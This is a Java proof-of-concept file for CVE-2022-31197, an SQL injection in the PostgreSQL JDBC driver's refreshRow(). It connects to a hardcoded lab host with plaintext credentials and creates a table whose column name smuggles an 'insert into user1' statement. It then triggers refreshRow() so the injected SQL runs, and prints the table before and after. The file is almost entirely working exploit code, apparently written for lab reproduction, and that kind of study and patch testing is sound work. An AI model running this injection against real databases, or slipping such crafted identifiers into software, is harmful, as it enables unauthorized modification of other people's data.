package postgresql;

import java.sql.*;

public class CVE_2022_31197 {

    public static void main(String[] args) throws ClassNotFoundException, SQLException {


        String url = "jdbc:postgresql://192.168.26.130:5432/test";
        String username = "postgres";
        String password = "123.com";
        Connection connection = DriverManager.getConnection(url, username, password);
        //设置允许同步更新
        Statement statement = connection.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);



        String sql_1 = "delete from user1 where id = 2";
        statement.executeUpdate(sql_1);

        String sql = "SELECT * FROM user1;";
        ResultSet resultSet = statement.executeQuery(sql);
        System.out.println("查询user表数据");
        while (resultSet.next()){
            int id = resultSet.getInt(1);
            String name = resultSet.getString(2);
            String money = resultSet.getString(3);
            System.out.println(id + name + money);
        }

        String sql0 = "drop table vul";
        statement.executeUpdate(sql0);
        System.out.println("删除漏洞测试表");

        String sql1 = "CREATE TABLE vul (id int PRIMARY KEY,\"1 FROM vul; insert into user1 values(2,'cao','fa'); SELECT * \" int);";
        statement.executeUpdate(sql1);
        System.out.println("创建漏洞测试表");

        String sql2 = "insert into vul values(1,2);";
        statement.executeUpdate(sql2);
        System.out.println("向漏洞测试表插入数据");

        String sql3 = "SELECT * FROM vul;";
        ResultSet resultSet1 = statement.executeQuery(sql3);
        System.out.println("查询洞测试表数据");

        try{
            while (resultSet1.next()){

                resultSet1.refreshRow();
            }
        }catch (Exception e){
            System.out.println("====");
        }



        String sql4 = "SELECT * FROM user1;";
        ResultSet resultSet2 = statement.executeQuery(sql4);
        System.out.println("查询user表数据");
        while (resultSet2.next()){
            int id = resultSet2.getInt(1);
            String name = resultSet2.getString(2);
            String money = resultSet2.getString(3);
            System.out.println(id + name + money);
        }


        statement.close();
        connection.close();
    }
}
